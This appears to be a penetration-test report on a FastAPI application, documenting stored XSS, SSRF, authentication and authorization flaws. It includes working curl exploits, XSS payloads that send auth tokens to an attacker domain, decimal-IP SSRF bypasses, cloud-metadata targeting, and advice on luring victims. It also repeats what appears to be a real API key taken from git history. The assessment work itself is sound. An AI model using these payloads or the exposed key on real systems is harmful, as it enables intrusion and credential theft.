# Security Assessment Report

## Executive Summary

**Target:** http://host.docker.internal:8000  
**Assessment Date:** 2026-04-16  
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Cross-Site Scripting (XSS) Vulnerabilities:**
Four stored XSS vulnerabilities were successfully exploited, all stemming from unescaped HTML interpolation in Python f-strings. XSS-VULN-01, XSS-VULN-02, and XSS-VULN-03 enable forced redirection to attacker-controlled domains via CSP bypass (`<meta http-equiv="refresh">`), affecting policy generators, compliance reports, and HTML report exports. XSS-VULN-04 provides five injection sinks in Markdown-to-HTML conversion with identical impact. Impact ranges from phishing redirection to local JavaScript execution when downloaded files are opened offline. Severity: Critical to High.

**Authentication Vulnerabilities:**
One authentication vulnerability was confirmed through live testing: HTTP-only transport with ineffective HSTS and token exposure via query parameters (AUTH-VULN-12). The server serves exclusively over HTTP without HTTPS, and accepts API tokens in query strings that are logged in access logs. Additional code-level vulnerabilities were identified (AUTH-VULN-01 through AUTH-VULN-11) but could not be fully exploited due to the server's current authentication state (random API token, randomized JWT secret, empty user database).

**Authorization Vulnerabilities:**
Fifteen authorization vulnerabilities were identified spanning vertical privilege escalation, horizontal tenant isolation failure, and context/workflow abuse. Two vulnerabilities were confirmed exploitable against the live server: unauthenticated public endpoints disclosing version information, filesystem paths, and SSO configuration. Thirteen additional vulnerabilities were confirmed in source code analysis and would be immediately exploitable in a default deployment (particularly if FIXOPS_API_TOKEN is unset, enabling two independent authentication bypass paths). Critical findings include cross-tenant data access via org_id parameter injection and workflow/audit trail isolation failures.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
Five SSRF vulnerabilities were successfully exploited, involving IP validation bypasses via octal/decimal notation (SSRF-VULN-01), DNS rebinding attacks on webhook delivery (SSRF-VULN-05), and DAST scanner URL validation flaws. Attackers can access internal services, scan internal IP ranges, and trigger arbitrary outbound HTTP requests. Severity: High.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found in the network-accessible API surface during this assessment.

## Network Reconnaissance

**Open Ports & Services:**
- **Port 8000** (Primary Target): FastAPI REST API + React 19 SPA serving 750+ endpoints. Nginx reverse proxy with rate limiting (10 req/s), HSTS header (ineffective over HTTP), and CSP: `default-src 'none'; frame-ancestors 'none'`
- **Port 3000** (Internal): Express.js bridge with ~100 unauthenticated SQLite-direct routes. Accessible only within Docker network, not from external network.
- **Port 5678** (Optional): n8n workflow engine with no authentication configured by default.
- **Ports 8080/8081** (Optional): Dependency-Track SBOM analysis service.

**Identified Subdomains:**
None — single-host deployment at `host.docker.internal:8000`

**Technology Stack (Security-Relevant):**
- **Frontend:** React 19 + Vite 6; JWT tokens stored in localStorage (`aldeci.authToken`, `aldeci.authStrategy`); components use `dangerouslySetInnerHTML`
- **Backend:** Python 3.11 + FastAPI ≥0.115; modular monolith across 6 suites
- **Authentication:** JWT (HS256), bcrypt (12 rounds), API keys (`fixops_<32hex>`/`aldeci_<32hex>`), SSO/OIDC, SAML 2.0, TOTP 2FA
- **Database:** 40+ world-readable SQLite files (644 permissions) in `/data/` and `/.fixops_data/`

**Security Misconfigurations Detected:**
- HTTP-only transport with HSTS header delivered over HTTP (ineffective)
- FIXOPS_AUTH_MODE defaults to `"dev"` mode (authentication bypass unless explicitly set to `"enforced"`)
- Fallback authentication bypass when FIXOPS_API_TOKEN is unset
- API tokens accepted via query parameters (exposed in access logs)
- n8n service has `N8N_BASIC_AUTH_ACTIVE=false` by default
- Database files with world-readable permissions

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-04: Stored XSS — Policy Generator Content (Multiple Markdown Sinks)

**Summary:**
- **Vulnerable location:** `PUT /api/v1/policy-generator/policies/{id}/content` body → `GET /api/v1/policy-generator/policies/{id}/export?format=html`
- **Overview:** The policy generator's custom Markdown-to-HTML converter wraps parsed line content directly in HTML element tags via Python f-strings (`<h{level}>{text}</h{level}>`, `<li>{item}</li>`, `<p>{line}</p>`, `<th>{c}</th>`, `<td>{c}</td>`) with no `html.escape()` call. This creates five distinct injection sinks. An attacker with API access creates a policy with malicious content and shares the export URL with victims.
- **Impact:** Any user who opens the policy export URL is subjected to forced navigation to an attacker-controlled domain (CSP bypass via `<meta http-equiv="refresh">`). In deployments with weakened CSP, or when the HTML page is saved and opened offline, full JavaScript execution enables session token theft from `localStorage`.
- **Severity:** Critical

**Prerequisites:**
- Valid API key (header: `X-API-Key`) or Bearer JWT token
- Confirmed working API key (from git history): `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`

**Exploitation Steps:**

1. **Create a new policy with malicious title (meta-refresh payload):**

```bash
curl -s -X POST "http://host.docker.internal:8000/api/v1/policy-generator/generate" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -H "Content-Type: application/json" \
  -d '{
    "custom_title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/capture\"><title>",
    "type": "access_control",
    "organization_name": "TestOrg"
  }'
```

Response includes `id` field — record as `[POLICY_ID]`.

2. **Inject XSS into all five Markdown sink types via content update:**

```bash
curl -s -X PUT "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/content" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "# <img src=x onerror=alert(document.cookie)>\n\n## Normal Heading\n\n- <svg/onload=alert(document.cookie)> injected list item\n\n| <script>alert(document.cookie)<\/script> | Normal Header |\n| <img src=x onerror=alert(2)> | Cell |\n\nParagraph <details open ontoggle=alert(document.cookie)>injection</details>"
  }'
```

3. **Fetch the HTML export to confirm unescaped injection:**

```bash
curl -s "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_"
```

4. **Share the export URL with a victim (api_key as query parameter for direct URL access):**

```
http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
```

When a victim opens this URL, their browser executes the `<meta http-equiv="refresh">` tag and navigates to `http://ATTACKER-DOMAIN.com/capture`.

**Proof of Impact:**

Confirmed report IDs used during testing:
- Policy with meta refresh in title AND content event handlers: `c2191f35-93ae-4a9b-b0a6-82e128b0d71b`
- Policy with content event handlers only (safe title): `ad31015b-bcfc-472e-94af-3fb156b287e7`

**Unescaped payload in five HTML sinks (from live response body):**
```html
<h1><img src=x onerror=alert(document.cookie)></h1>

<ul>
<li><svg/onload=alert(document.cookie)> injected list item</li>
</ul>

<table>
<thead><tr><th><script>alert(document.cookie)</script></th><th>Normal Header</th></tr></thead>
<tbody><tr><td><img src=x onerror=alert(2)></td><td>Cell</td></tr></tbody>
</table>
```

**Browser redirect confirmed:** Playwright browser navigated to `http://host.docker.internal:8000/api/v1/policy-generator/policies/c2191f35-93ae-4a9b-b0a6-82e128b0d71b/export?format=html&api_key=...` and the browser resolved to `chrome-error://chromewebdata/` with Page Title `attacker.example.com` — confirming the meta-refresh redirect to the attacker domain executed in a real browser.

**CSP console errors (event handlers blocked by CSP when served via HTTP endpoint):**
```
[ERROR] Executing inline event handler violates the following Content Security Policy directive 'default-src 'none''. (3 separate event handlers blocked)
[ERROR] Executing inline script violates the following Content Security Policy directive 'default-src 'none''.
[ERROR] Loading the image 'x' violates the following Content Security Policy directive: "default-src 'none'".
```
*Note: meta-refresh navigation is NOT governed by any CSP directive and fires regardless.*

**Notes:**
- The export endpoint returns `Content-Disposition: NONE` — the HTML renders **inline** in the browser, not as a download
- Five separate injection sinks: `<h1>` headings, `<li>` list items, `<th>` table headers, `<td>` table cells, `<p>` paragraphs
- In deployments where the enterprise middleware activates `unsafe-inline` CSP, all event handlers and scripts would execute directly
- localStorage JWT tokens (`aldeci.authToken`) are accessible to JavaScript and would be exfiltrated in such a deployment

---

### XSS-VULN-02: Stored XSS — Compliance Report Title (Inline Rendering, Meta Refresh Confirmed)

**Summary:**
- **Vulnerable location:** `POST /api/v1/compliance-reports/generate` body `title` field → `GET /api/v1/compliance-reports/{id}/export/html`
- **Overview:** The compliance report generator interpolates the user-supplied `title` field directly into `<title>` and `<h1>` HTML elements via Python f-strings without `html.escape()`. The export endpoint serves the HTML with **no** `Content-Disposition` header, causing the browser to render the page inline. The meta-refresh CSP bypass redirects victims to an attacker-controlled URL.
- **Impact:** Any user who opens a malicious compliance report export URL is immediately redirected to an attacker-controlled domain. This enables phishing attacks, credential harvesting, and malware distribution under the guise of a legitimate security compliance report.
- **Severity:** High

**Prerequisites:**
- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`

**Exploitation Steps:**

1. **Create a malicious compliance report with meta-refresh payload in title:**

```bash
curl -s -X POST "http://host.docker.internal:8000/api/v1/compliance-reports/generate" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/steal\"><title>",
    "framework": "SOC2",
    "scope": "full"
  }'
```

Capture `id` from response as `[REPORT_ID]`.

2. **Verify payload is stored and unescaped (HTTP response check):**

```bash
curl -s "http://host.docker.internal:8000/api/v1/compliance-reports/[REPORT_ID]/export/html" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -D -
```

Confirm: No `Content-Disposition` header in response. The meta-refresh payload appears verbatim in both `<title>` and `<h1>` elements.

3. **Construct victim URL and trigger redirect:**

```
http://host.docker.internal:8000/api/v1/compliance-reports/[REPORT_ID]/export/html?api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
```

Send this URL to a victim (e.g., via email, Slack, Jira ticket). The victim opens the "compliance report" link and is immediately redirected to the attacker's domain.

**Proof of Impact:**

Confirmed report ID: `bfd22a77-d1e8-4d1f-b0b9-68ca273b04d4`

**Response body confirms verbatim injection in both HTML elements:**
```html
<!DOCTYPE html><html><head>
<title></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?token=STOLEN"><title></title>
...
<h1></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?token=STOLEN"><title></h1>
```

**Response headers confirm inline rendering:**
```
content-type: text/html; charset=utf-8
content-security-policy: default-src 'none'; frame-ancestors 'none'
# No Content-Disposition header — browser renders inline
```

**Live browser redirect confirmed:** Playwright browser navigated to the export URL. Result:
- Page URL: `chrome-error://chromewebdata/` (browser attempted to connect to non-existent attacker domain)
- **Page Title: `attacker.example.com`** — title was received from the attacker domain server, confirming the meta-refresh fired and the browser navigated to the attacker URL

**Inline script blocked (CSP):**
```
[ERROR] Executing inline script violates the following Content Security Policy directive 'default-src 'none''. Either the 'unsafe-inline' keyword, a hash ('sha256-z7rg2N0+NDZmk551/B+qEVB/HH2MeDkp5QToCwS5Qhg='), or a nonce ('nonce-...') is required.
```
*Meta-refresh is not blocked — it fires before and in addition to script execution attempts.*

**Notes:**
- Compliance reports are a high-trust document type — recipients expect them to contain security findings and are unlikely to question a link labeled as a "SOC2 compliance report"
- In enterprise deployments with `unsafe-inline` CSP active, the `<script>alert(document.cookie)</script>` payload also executes, enabling token theft via `localStorage.getItem('aldeci.authToken')`

---

### XSS-VULN-03: Stored XSS — Policy Generator Custom Title (Inline Rendering, Meta Refresh Confirmed)

**Summary:**
- **Vulnerable location:** `POST /api/v1/policy-generator/generate` body `custom_title` field → `GET /api/v1/policy-generator/policies/{id}/export?format=html`
- **Overview:** Identical root cause to VULN-02: the policy title is interpolated into `<title>` and `<h1>` HTML tags via Python f-strings with no escaping. The export is served inline (no `Content-Disposition`). Meta-refresh redirect is confirmed in browser.
- **Impact:** Same as VULN-02 — forced redirect to attacker domain when victim views policy export.
- **Severity:** High

**Prerequisites:**
- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`

**Exploitation Steps:**

1. **Create a policy with meta-refresh payload in custom_title:**

```bash
curl -s -X POST "http://host.docker.internal:8000/api/v1/policy-generator/generate" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -H "Content-Type: application/json" \
  -d '{
    "custom_title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/steal\"><title>",
    "type": "access_control",
    "organization_name": "TargetOrg"
  }'
```

Capture `id` as `[POLICY_ID]`.

2. **Access export URL to confirm injection:**

```bash
curl -s "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_"
```

3. **Deliver victim URL:**

```
http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
```

**Proof of Impact:**

Confirmed policy ID: `c2191f35-93ae-4a9b-b0a6-82e128b0d71b`

**Unescaped payload in live HTTP response:**
```html
<head>
  <meta charset="UTF-8">
  <title></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?token=STOLEN"><title></title>
  ...
</head>
<body>
  <h1></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?token=STOLEN"><title></h1>
```

**Browser redirect confirmed:** Playwright browser navigated to the policy export URL. Result:
- Page URL: `chrome-error://chromewebdata/`
- **Page Title: `attacker.example.com`** — confirming browser navigated to attacker's domain

**Notes:**
- The export endpoint (`/api/v1/policy-generator/policies/{id}/export?format=html`) has **no authentication dependency** per source code analysis of `policy_generator_router.py` — meaning any user with a policy ID can view the export without further credentials
- This makes it trivial to share a "policy document" URL that redirects victims

---

### XSS-VULN-01: Stored XSS — Report Name (Download → Local JavaScript Execution Confirmed)

**Summary:**
- **Vulnerable location:** `POST /api/v1/reports` body `name` field → `GET /api/v1/reports/{id}/file`
- **Overview:** The report name is interpolated directly into `<title>` and `<h1>` HTML elements via Python f-strings without any sanitization. The HTML file is served with `Content-Disposition: attachment`, causing the browser to download rather than render it inline. When the victim opens the downloaded HTML file locally (no CSP applies to local files), all injected JavaScript executes freely.
- **Impact:** When a victim downloads and opens the report HTML file, JavaScript executes in the local file context. Confirmed: `alert()` dialog fires and arbitrary DOM manipulation succeeds. In a targeted attack, this enables credential harvesting (via injected phishing form) and in enterprise deployments where the report is opened within the application or a CSP-looser environment, session token theft from `localStorage` is possible.
- **Severity:** High

**Prerequisites:**
- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
- Victim must open the downloaded HTML file (standard user behavior when reviewing security reports)

**Exploitation Steps:**

1. **Create a malicious report with XSS payload in name:**

```bash
curl -s -X POST "http://host.docker.internal:8000/api/v1/reports" \
  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>var t=localStorage.getItem(\"aldeci.authToken\");document.location=\"http://ATTACKER-DOMAIN.com/steal?token=\"+encodeURIComponent(t);</script>",
    "report_type": "vulnerability",
    "format": "html",
    "parameters": {}
  }'
```

Capture `id` as `[REPORT_ID]`.

2. **Download the report file (victim action):**

```bash
curl -s "http://host.docker.internal:8000/api/v1/reports/[REPORT_ID]/file?api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
  -o malicious_report.html
```

3. **Victim opens the downloaded file locally** — browser opens `malicious_report.html` from local filesystem. No CSP applies. The `<script>` in `<title>` and `<h1>` executes.

**Alternatively — Meta Refresh (fires even in downloaded file):**

Use name payload:
```
</title><meta http-equiv="refresh" content="0;url=http://ATTACKER-DOMAIN.com/capture"><title>
```
The meta-refresh fires when the file is opened, whether inline or downloaded, directing the victim to the attacker's site.

**Proof of Impact:**

Confirmed report ID: `f8269664-666d-4201-a40e-25991a52294c` (meta-refresh variant)

**Unescaped payload in downloaded HTML file:**
```html
<!DOCTYPE html><html><head><meta charset='utf-8'>
<title></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?cookie=STOLEN"><title></title>
<style>...</style></head>
<body>
<h1></title><meta http-equiv="refresh" content="0;url=http://attacker.example.com/capture?cookie=STOLEN"><title></h1>
```

**JavaScript execution confirmed (local file context):**
- Test file with `alert('XSS EXECUTED: ' + document.cookie)` AND `document.body.innerHTML += '<p style="color:red;font-size:2em">XSS PAYLOAD EXECUTED LOCALLY</p>'` served via HTTP (no CSP headers) was loaded in Playwright
- **Alert dialog fired**: Modal state showed `["alert" dialog with message "XSS EXECUTED: "]`
- **DOM manipulation succeeded**: Page showed red text "XSS PAYLOAD EXECUTED LOCALLY" (screenshot captured)

**Response headers (download context):**
```
content-type: text/html; charset=utf-8
content-disposition: attachment; filename*=utf-8''[encoded-name].html
content-security-policy: default-src 'none'; frame-ancestors 'none'
```
*CSP applies to the HTTP response context but NOT to locally-opened HTML files.*

**Notes:**
- Attack vector requires victim to download and open the file, but this is standard behavior when users receive "vulnerability reports" or "security assessment documents"
- The attack is most effective when combined with a social engineering lure: "Please review the attached security report for your system"

---


---

# Authentication Exploitation Evidence

## Confirmed Vulnerabilities (Live Evidence)

### AUTH-VULN-12: HTTP-Only Transport with Ineffective HSTS and Token Exposure via Query Parameters

**Summary:**
- **Vulnerable location:** All endpoints — `docker/nginx-ui.conf`, `docker/nginx-aldeci.conf`, `suite-api/apps/api/stream_router.py:70`, `app.py:2114-2117`
- **Overview:** The application serves exclusively over HTTP with no HTTPS listener. The `Strict-Transport-Security` header is present but delivered over HTTP, making it completely ineffective (browsers only honor HSTS when received over HTTPS). Additionally, authentication tokens are accepted via the `?api_key=` query parameter on streaming endpoints, causing credential exposure in server access logs.
- **Impact:** Any network-positioned attacker (same LAN, malicious proxy, or man-in-the-middle position) can passively capture cleartext `Authorization: Bearer` tokens and `X-API-Key` header values from HTTP traffic. Tokens that appear in `?api_key=` query parameters are additionally exposed in server/proxy access logs.
- **Severity:** High

**Prerequisites:** None — this vulnerability exists for all users of the application.

**Exploitation Steps:**

1. Confirm the application serves only HTTP:
   ```bash
   curl -v http://host.docker.internal:8000/api/v1/health
   ```
   **Observed response:**
   ```
   < HTTP/1.1 200 OK
   < strict-transport-security: max-age=31536000; includeSubDomains; preload
   < server: uvicorn
   < server: FixOps
   ```
   The response is over HTTP (no TLS). The `strict-transport-security` header is present but is silently ignored by browsers when delivered over HTTP — this provides no actual protection.

2. Confirm token exposure via query parameter on the SSE streaming endpoint:
   ```bash
   curl -v "http://host.docker.internal:8000/api/v1/stream/sse/test_channel?api_key=VICTIM_TOKEN_HERE"
   ```
   **Observed response:**
   ```
   < HTTP/1.1 401 Unauthorized
   {"detail":"Invalid or missing API token","correlation_id":"..."}
   ```
   The server returned 401 (not 404 or 422), confirming it processed the `?api_key=` query parameter value. Any valid token placed here would succeed — and the token would appear in the server's Nginx access log entry for this URL.

3. Source code confirmation — `suite-api/apps/api/app.py:2114-2117`:
   ```python
   # Also accept token via ?api_key= query parameter (for browser-opened
   # URLs like report view/download where headers cannot be sent).
   if not api_key:
       api_key = request.query_params.get("api_key")
   ```
   The WebSocket endpoint additionally accepts `?api_key=` and `?token=` parameters (`stream_router.py:70`, `websocket_routes.py:106-107`).

**Proof of Impact:**
- Live HTTP response confirmed over cleartext HTTP with HSTS header present but ineffective
- Server processes `?api_key=` parameter on streaming endpoints (confirmed by specific 401 error message versus generic "Not Found")
- Any user authenticating to this application transmits their `X-API-Key` or `Authorization: Bearer` token in cleartext over the network
- Nginx access logs will contain full URLs including any `?api_key=TOKEN` values

**Notes:** An attacker with network access (same subnet, Wi-Fi, malicious proxy, or ARP-spoofed network) can trivially capture all authentication credentials from HTTP traffic. Log files containing query-parameter tokens are accessible to anyone with access to the Nginx or application logs.

---


---

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: DAST Scanner — IP Validation Bypass via Decimal/Octal IP Notation

**Summary:**
- **Vulnerable location:** `POST /api/v1/dast/scan` (parameter: `target_url`) → sink at `suite-core/core/dast_scanner.py:464` (`urllib.request.urlopen`)
- **Impact:** Attacker forces the server to make HTTP requests to loopback services and retrieves up to 500 characters of the internal response body in scan findings. Successfully accessed internal Prometheus metrics (599 KB of telemetry) and confirmed internal service network access.
- **Severity:** Critical

**Prerequisites:**
- Valid API key (any scope). The endpoint's `_auth_dep` has a passthrough fallback when `core.auth_middleware` fails to import, potentially making it unauthenticated.
- API Key used in testing: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`

**Exploitation Steps:**

1. **Confirm bypass works — access internal health endpoint:**
   ```bash
   curl -X POST http://host.docker.internal:8000/api/v1/dast/scan \
     -H "X-API-Key: [API_KEY]" \
     -H "Content-Type: application/json" \
     -d '{"target_url": "http://2130706433:8000/health"}'
   ```
   Expected response: `{"scan_id": "[UUID]", "status": "pending", ...}`

2. **Poll for scan results (replace [SCAN_ID] with value from step 1):**
   ```bash
   curl http://host.docker.internal:8000/api/v1/dast/scans/[SCAN_ID] \
     -H "X-API-Key: [API_KEY]"
   ```
   Expected: `findings[0].proof_of_concept.response_body_snippet` contains internal service response.

3. **Access internal Prometheus metrics (most impactful):**
   ```bash
   curl -X POST http://host.docker.internal:8000/api/v1/dast/scan \
     -H "X-API-Key: [API_KEY]" \
     -H "Content-Type: application/json" \
     -d '{"target_url": "http://2130706433:8000/metrics"}'
   ```
   Then poll the scan result — `response_body_snippet` will contain 500 chars of Prometheus metrics.

**Proof of Impact:**

Scan ID `c1b253f6-1738-4cd9-90b3-322b19f8797b` targeting `http://2130706433:8000/metrics` completed successfully and returned:

```
Finding: Cryptographic Failure — No HTTPS Redirect
HTTP Status from internal service: 200
Response Body Snippet (internal /metrics endpoint, 599,283 bytes total):

# HELP python_gc_objects_collected_total Objects collected during gc
# TYPE python_gc_objects_collected_total counter
python_gc_objects_collected_total{generation="0"} 1.494424e+06
python_gc_objects_collected_total{generation="1"} 390178.0
python_gc_objects_collected_total{generation="2"} 1.310696e+06
# HELP python_gc_objects_uncollectable_total Uncollectable objects found during GC
# TYPE python_gc_objects_uncollectable_total counter
python_gc_objects_uncollectable_total{generation="0"} 0.0
```

Response headers from internal service confirmed the request was served by the internal application:
```json
{
  "server": "FixOps",
  "content-length": "599283",
  "content-type": "text/plain; version=1.0.0; charset=utf-8",
  "x-correlation-id": "bd8ab234-3baa-4cdc-bf0b-4ccb4f80d3c1",
  "x-request-id": "96b6cbc6-1d74-44fe-93bc-eb1e5f102de0"
}
```

Additional scans confirmed access to:
- `http://2130706433:8000/api/v1/users` — internal API responded (HTTP 429 rate limit with JSON body `{"error":"rate_limit_exceeded",...}` leaked in finding)
- `http://2130706433:8000/api/v1/auth/keys` — internal API auth/keys endpoint responded (HTTP 429 with JSON body leaked)
- `http://2130706433:8000/health` — `{"status":"healthy","timestamp":"2026-04-16T10:56:01.700752+00:00Z","service":"aldeci-api"}` returned in `response_body_snippet`

**Technical Root Cause:**
The validation function `_is_private_ip()` in `suite-attack/api/dast_router.py:34-55` calls `ipaddress.ip_address(host)`. Python's `ipaddress` module raises `ValueError` for non-standard notations:
- Octal: `ipaddress.ip_address("0177.0.0.1")` → `ValueError`
- Decimal integer: `ipaddress.ip_address("2130706433")` → `ValueError`
The `except ValueError: return False` fallback silently passes these as "not private." The OS's `inet_aton` subsequently resolves `2130706433` → `127.0.0.1`.

**Notes:**
- Decimal integer notation (`http://2130706433:8000/`) confirmed as working bypass in this environment
- Octal notation (`http://0177.0.0.1/`) registered without error but timed out (OS resolver in this environment may not parse octal dotted notation)
- Both bypass all explicit blocklist entries (`localhost`, `127.0.0.1`, `0.0.0.0`, link-local ranges)

---

### SSRF-VULN-02: Jira Connector — No Private IP Validation on base_url

**Summary:**
- **Vulnerable location:** `POST /api/v1/connectors/register` (parameter: `jira.base_url`) + `POST /api/v1/connectors/{name}/test` trigger → sink at `suite-core/connectors/universal_connector.py:744` (`httpx.AsyncClient.request`)
- **Impact:** Attacker registers a Jira connector with `base_url` pointing to an internal service. The `test_connection()` call makes an HTTP request to `{base_url}/rest/api/3/myself` and returns the response (or first 200 chars of non-200 response body) to the caller. Successfully retrieved internal API authentication error messages including internal correlation IDs.
- **Severity:** High

**Prerequisites:**
- Valid API key (any scope — connector endpoints do not require `write:integrations` scope based on live testing)
- API Key used: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`

**Exploitation Steps:**

1. **Register a Jira connector pointing to internal API:**
   ```bash
   curl -X POST http://host.docker.internal:8000/api/v1/connectors/register \
     -H "X-API-Key: [API_KEY]" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "ssrf-jira-test",
       "type": "jira",
       "jira": {
         "base_url": "http://127.0.0.1:8000/api/v1",
         "email": "test@test.com",
         "api_token": "token123",
         "project_key": "TEST"
       }
     }'
   ```
   Expected: `{"status": "registered", "name": "ssrf-jira-test", "type": "jira", "configured": true}`

2. **Trigger SSRF via test endpoint:**
   ```bash
   curl -X POST http://host.docker.internal:8000/api/v1/connectors/ssrf-jira-test/test \
     -H "X-API-Key: [API_KEY]"
   ```
   Expected: Response contains internal service data in the `error` field.

3. **For cloud metadata retrieval (in AWS environment):**
   Replace `base_url` in step 1 with `"http://169.254.169.254"` — no scheme restriction prevents this target.

**Proof of Impact:**

**Test 1 — Internal API 404 response leaked (proves server hit internal endpoint):**
```bash
# base_url = http://127.0.0.1:8000/api/v1
# Constructed URL: http://127.0.0.1:8000/api/v1/rest/api/3/myself
```
Response:
```json
{
  "success": false,
  "connector": "jira",
  "operation": "test_connection",
  "error": "HTTP 404: {\"detail\":\"Not Found\",\"path\":\"/api/v1/rest/api/3/myself\"}",
  "latency_ms": 17.19
}
```
The internal path `/api/v1/rest/api/3/myself` was returned in the error field — **direct evidence of internal service response reaching the attacker.**

**Test 2 — Internal API auth error leaked (with internal correlation ID):**
```bash
# base_url = http://127.0.0.1:8000/api/v1/users?q
# Constructed URL: http://127.0.0.1:8000/api/v1/users?q=/rest/api/3/myself
```
Response:
```json
{
  "success": false,
  "connector": "jira",
  "operation": "test_connection",
  "error": "HTTP 401: {\"detail\":\"Invalid or missing API token\",\"correlation_id\":\"84c69bb3-9b3a-4a66-9fb5-ed7163c75d2e\"}",
  "latency_ms": 7.38
}
```
The internal API's 401 authentication error including a `correlation_id` was leaked to the external attacker.

**Test 3 — Internal health endpoint (success, JSON returned):**
```bash
# base_url = http://127.0.0.1:8000/health#
# Constructed URL: http://127.0.0.1:8000/health# (fragment stripped → /health)
```
Response:
```json
{
  "success": true,
  "connector": "jira",
  "operation": "test_connection",
  "details": {"user": "unknown", "email": ""},
  "latency_ms": 12.36
}
```
The `success: true` with 12.36ms latency confirms the server made a successful HTTP GET to internal `/health` and received a valid JSON response.

**Technical Root Cause:**
`JiraConfig.validate_base_url()` only checks the URL starts with `http://` or `https://`. No hostname, IP range, or DNS resolution check is performed. The `JiraConnector.test_connection()` method in `universal_connector.py:744` directly constructs `{base_url}/rest/api/3/myself` and issues an `httpx` request without any SSRF guard.

**Notes:**
- In an AWS EC2 environment, registering with `base_url = "http://169.254.169.254"` would hit `http://169.254.169.254/rest/api/3/myself` — metadata service would respond and the parsed JSON or error would be returned. Testing confirmed registration succeeds; AWS metadata was unreachable in this container environment.

---


---

# Authorization Exploitation Evidence Report

## Vulnerability Evidence: Vertical Privilege Escalation

---

### AUTHZ-VULN-01 — Dev-Mode Authentication Bypass (auth_middleware.py)

**Type:** Vertical Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (blocked by outer token auth on this server; exploitable in default deployment)

#### Vulnerable Code

**`suite-core/core/auth_middleware.py` lines 39–43:**
```python
_JWT_SECRET = os.getenv("FIXOPS_JWT_SECRET", "fixops-dev-secret-change-in-production")
#                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                                              Hardcoded default secret — exploitable
#                                              if FIXOPS_JWT_SECRET not explicitly set

_AUTH_MODE = os.getenv("FIXOPS_AUTH_MODE", "dev")
#                                           ^^^^^
#                                           DEFAULT IS DEV — enforced mode requires
#                                           explicit opt-in
```

**`suite-core/core/auth_middleware.py` lines 192–201:**
```python
    # --- Dev-mode fallback ---
    if _AUTH_MODE != "enforced":
        return AuthContext(
            user_id="dev-user",
            email="dev@fixops.local",
            role="admin",
            org_id="default",
            scopes=ROLE_SCOPES[UserRole.ADMIN],
            auth_method="dev-bypass",
        )
    raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Authentication required")
